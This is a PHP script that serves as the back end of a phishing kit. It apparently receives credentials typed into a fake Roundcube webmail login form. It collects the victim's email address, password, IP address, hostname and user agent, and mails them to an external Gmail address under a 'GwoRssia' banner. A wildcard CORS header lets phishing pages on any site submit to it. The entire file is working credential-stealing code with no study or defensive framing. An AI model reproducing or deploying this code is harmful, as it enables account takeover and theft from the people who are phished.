<?php
// Allow CORS
header("Access-Control-Allow-Origin: *"); // Specify the allowed origin
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit; // Exit for preflight requests
}

// Check if required fields are present
if (isset($_POST['rcmloginuser']) && isset($_POST['rcmloginpwd'])) {
    $username = trim($_POST['rcmloginuser']);
    $password = trim($_POST['rcmloginpwd']);
    
    // Basic validation
    if (empty($username) || empty($password)) {
        echo json_encode(['status' => 'error', 'message' => 'Username and password cannot be empty.']);
        exit;
    }

    // Get client info
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Construct the email message
    $message = "--------------Jinx Info by GwoRssia-----------------------\n";
    $message .= "Email               : " . $username . "\n";
    $message .= "Password            : " . $password . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|----------- unknown --------------|\n";

    // Set email subject
    $subject = "GwoRssia | $ip";

    // Specify the recipient email address
    $to = "xmail@gmail.com";

    // Send the email
    if (mail($to, $subject, $message)) {
        // Redirect the user after sending the email
        echo json_encode(['status' => 'success', 'message' => 'Email sent successfully.']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send email.']);
    }
    
} else {
    // Return an error if fields are missing
    echo json_encode(['status' => 'error', 'message' => 'Required fields are missing.']);
}
?>
